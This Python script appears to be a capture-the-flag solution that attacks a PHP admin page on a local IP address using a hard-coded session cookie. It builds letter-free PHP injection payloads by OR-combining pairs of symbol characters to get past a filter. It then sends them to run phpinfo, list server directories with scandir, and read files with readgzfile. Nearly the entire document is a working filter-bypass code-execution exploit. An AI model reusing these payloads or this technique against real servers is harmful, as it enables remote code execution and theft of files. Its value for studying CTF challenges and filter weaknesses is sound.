import string
import requests


URL = "http://192.168.0.109:55555/sup3r_secret_admin_page_by_goerli_gogo.php";
cookie = {
  'PHPSESSID':'b6f0268f18ebd7582b8086c91dabd6d7'
}

def make_payload(pay):
  # pay = "</pre>"
  w = {c:[] for c in pay}
  cand = '0123456789!#$%&()*+,-./:;<=>?@[]^_{|}~"\''
  for c in cand:
      if c not in string.ascii_letters:
          for d in cand:
              if d not in string.ascii_letters:
                  f = chr(ord(c)|ord(d))
                  if f in w and not w[f]:
                      w[f].append((c, d))

  one = []
  two = []
  for c in pay:
    one.append(w[c][0][0])
    two.append(w[c][0][1])

  return f'"{"".join(one)}"|"{"".join(two)}"'



final_payload = f"""
  ({make_payload('phpinfo')})();
"""

print(final_payload)

data = {
  "command":final_payload
}

response = requests.post(URL, data=data, cookies=cookie)
print(response.text);
print(final_payload);


# (var_dump)((scandir)('/'));
final_payload = f"""
({make_payload("var_dump")})(({make_payload('scandir')})({make_payload('/')}));
"""
data = {
  "command":final_payload
}

response = requests.post(URL, data=data, cookies=cookie)
print(response.text);
print(final_payload);


final_payload = f"""
({make_payload("var_dump")})(({make_payload('scandir')})({make_payload('/nft-collection')}));
"""

data = {
  "command":final_payload
}

response = requests.post(URL, data=data, cookies=cookie)
print(response.text);
print(final_payload);


final_payload = f"""
({make_payload("readgzfile")})({make_payload("/nft-collection/nft002")});
"""

data = {
  "command":final_payload
}

response = requests.post(URL, data=data, cookies=cookie)
print(response.text);
print(final_payload);


final_payload = f"""
({make_payload("readgzfile")})({make_payload("/nft-collection/you_might_need_this")});
"""

data = {
  "command":final_payload
}

response = requests.post(URL, data=data, cookies=cookie)
print(response.text);
print(final_payload);

